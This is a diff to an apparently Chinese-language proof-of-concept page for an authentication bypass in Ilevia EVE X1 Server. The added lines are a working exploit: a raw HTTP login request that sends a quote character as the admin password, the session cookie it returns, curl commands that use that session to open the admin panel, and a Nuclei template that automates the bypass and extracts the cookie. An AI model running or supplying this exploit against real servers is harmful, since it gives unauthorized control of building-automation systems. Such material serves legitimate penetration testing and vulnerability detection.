@@ -22,7 +22,37 @@ icon_hash="392278119"
 
 ## POC
 
-### Nuclei
+### 认证绕过 POC
+
+```http
+POST /login/login.php HTTP/1.1
+Host: target
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 35
+
+userid=admin&passwd=%22&login=Login
+
+HTTP/1.1 200 OK
+Set-Cookie: PHPSESSID=2qc9107b7584d8fh76pgmijf89; path=/
+
+# 使用获取的 PHPSESSID 访问后台
+GET /main/index.php HTTP/1.1
+Host: target
+Cookie: PHPSESSID=2qc9107b7584d8fh76pgmijf89
+```
+
+### Curl POC
+
+```bash
+# 1. 获取 session
+curl -v -X POST "http://target/login/login.php" \
+  -d "userid=admin&passwd=%22&login=Login"
+
+# 2. 使用 session 访问后台
+curl -v -H "Cookie: PHPSESSID=your_session_id" "http://target/main/index.php"
+```
+
+### Nuclei POC
 
 ```yaml
 id: ilevia-eve-x1-auth-bypass
@@ -34,14 +64,22 @@ info:
   description: Ilevia EVE X1 Server login.php authentication bypass
 
 requests:
-  - method: GET
+  - method: POST
     path:
-      - "{{BaseURL}}/login.php"
+      - "{{BaseURL}}/login/login.php"
+    body: "userid=admin&passwd=%22&login=Login"
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
     matchers:
-      - type: word
-        words:
-          - "EVE X1"
-          - "login"
+      - type: regex
+        part: header
+        regex:
+          - "PHPSESSID=[a-z0-9]+"
+    extractors:
+      - type: regex
+        part: header
+        regex:
+          - "PHPSESSID=([a-z0-9]+)"
 ```
 
 ### Curl POC
